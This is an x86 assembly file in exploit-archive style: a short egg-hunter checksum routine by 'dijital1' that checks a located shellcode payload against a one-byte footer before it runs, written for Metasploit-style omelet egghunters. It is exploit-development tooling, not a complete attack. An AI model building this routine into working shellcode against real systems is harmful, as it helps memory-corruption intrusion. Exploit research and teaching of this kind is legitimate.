;Exploit Title: Shellcode Checksum Routine
;Date: Sept 1 2010
;Author: dijital1
;Software Link:  http://www.ciphermonk.net/code/exploits/shellcode-checksum.asm
;Tested on: Omelet Hunter Shellcode in MSF
;"|------------------------------------------------------------------|"
;"|                         __               __                      |"
;"|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
;"|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
;"| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
;"| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
;"|                                                                  |"
;"|                                       http://www.corelan.be:8800 |"
;"|                                              security@corelan.be |"
;"|                                                                  |"
;"|-------------------------------------------------[ EIP Hunters ]--|"
;"               -= Egg Hunter Checksum Routine     - dijital1 =-     "

[BITS 32]

;Author: Ron Henry - dijital1
;Email: rlh@ciphermonk.net
;Site: http://www.ciphermonk.net
;Greetz to Exploit-db and Team Corelan

;Ok... couple of assumptions with this code. First, we're using a single
;byte as the checksum which gives us a 1 in 255 or ~0.39% chance of a
;collision.
;We consider this a worthwhile risk given the overall size of the code; 18 bytes.

;There are a couple ways to implement this, but a good example is how it
;was used in Peter Van Eeckhoutte's omelet egghunter mixin that was recently
;added to the Metasploit Framework.

;We're using a 1 byte footer at the end of the shellcode that contains the
;checksum generated at shellcode creation.

; Variables eax: accumulator
;           edx: points to current byte in shellcode
;           ecx: counter

egg_size equ 0x7a       ;we're testing 122 bytes in this instance

find_egg:

xor ecx, ecx            ;zero the counter
xor eax, eax            ;zero the accumlator

calc_chksum_loop:
add al, byte [edx+ecx]  ;add the byte to running total
inc ecx                 ;increment the counter
cmp cl, egg_size        ;cmp counter to egg_size
jnz calc_chksum_loop    ;if it's not equal repeat

test_ckksum:
cmp al, byte [edx+ecx]  ;cmp eax with 1 byte checksum
jnz find_egg            ;search for another egg if checksum is bogus